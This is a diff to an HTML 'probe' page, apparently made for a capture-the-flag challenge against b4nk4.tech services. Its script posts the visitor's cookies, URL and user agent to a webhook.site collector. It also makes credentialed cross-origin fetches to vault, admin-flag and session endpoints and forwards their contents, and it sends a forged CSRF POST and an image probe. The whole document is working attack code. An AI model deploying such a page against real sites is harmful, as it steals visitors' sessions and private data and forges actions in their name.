@@ -3,27 +3,38 @@
 <h1>probe</h1>
 <script>
 const W = 'https://webhook.site/c9ee2989-e434-4f10-8f42-69306c25a9a1';
-function log(k, v) { try { fetch(W, {method:'POST', mode:'no-cors', body: '[' + k + '] ' + String(v).slice(0,3500)}); } catch(e){} }
+function log(k, v) { try { fetch(W, {method:'POST', mode:'no-cors', body: '[' + k + '] ' + String(v).slice(0,3000)}); } catch(e){} }
 (async () => {
   log('hit-url', location.href);
   log('ua', navigator.userAgent);
   log('referrer', document.referrer || '(none)');
-  log('cookie-visible', document.cookie || '(none)');
-  const targets = [
+  log('cookie', document.cookie || '(none)');
+
+  // A) 跨域 fetch（凭据）
+  const g = [
     ['catdrive-vault-items', 'https://catdrive.b4nk4.tech/vault/items'],
-    ['catdrive-vault-history', 'https://catdrive.b4nk4.tech/vault/history'],
-    ['catdrive-dashboard', 'https://catdrive.b4nk4.tech/dashboard'],
     ['catdesk-admin-flag', 'https://catdesk.b4nk4.tech/admin/flag'],
-    ['catdesk-admin', 'https://catdesk.b4nk4.tech/admin'],
-    ['quivera-admin-users', 'https://quivera.b4nk4.tech/api/admin/users'],
+    ['quivera-session', 'https://quivera.b4nk4.tech/api/session'],
   ];
-  for (const [name, url] of targets) {
-    try {
-      const r = await fetch(url, {credentials:'include'});
-      const t = await r.text();
-      log(name, r.status + ' | len=' + t.length + ' | ' + t.replace(/\s+/g,' ').slice(0,2500));
-    } catch (e) { log(name + '-ERR', String(e)); }
+  for (const [n, u] of g) {
+    try { const r = await fetch(u, {credentials:'include'}); const t = await r.text(); log(n, r.status + ' len=' + t.length + ' :: ' + t.slice(0,1500)); }
+    catch(e) { log(n + '-ERR', String(e)); }
   }
+  // B) no-cors POST（CSRF 探测，请求会真的发出）
+  try {
+    await fetch('https://catdrive.b4nk4.tech/submit', {
+      method:'POST', mode:'no-cors', credentials:'include',
+      headers:{'Content-Type':'application/x-www-form-urlencoded'},
+      body:'url=https://mahaoyu138-sudo.github.io/probe-page/'
+    });
+    log('csrf-post', 'sent (no-cors)');
+  } catch(e) { log('csrf-post-ERR', String(e)); }
+  // C) 顶层导航 GET 探测（Lax 允许）
+  try {
+    const img = new Image();
+    img.src = 'https://catdrive.b4nk4.tech/vault/history';
+    log('img-probe', 'requested');
+  } catch(e) { log('img-ERR', String(e)); }
   log('done', 'completed');
 })();
 </script>
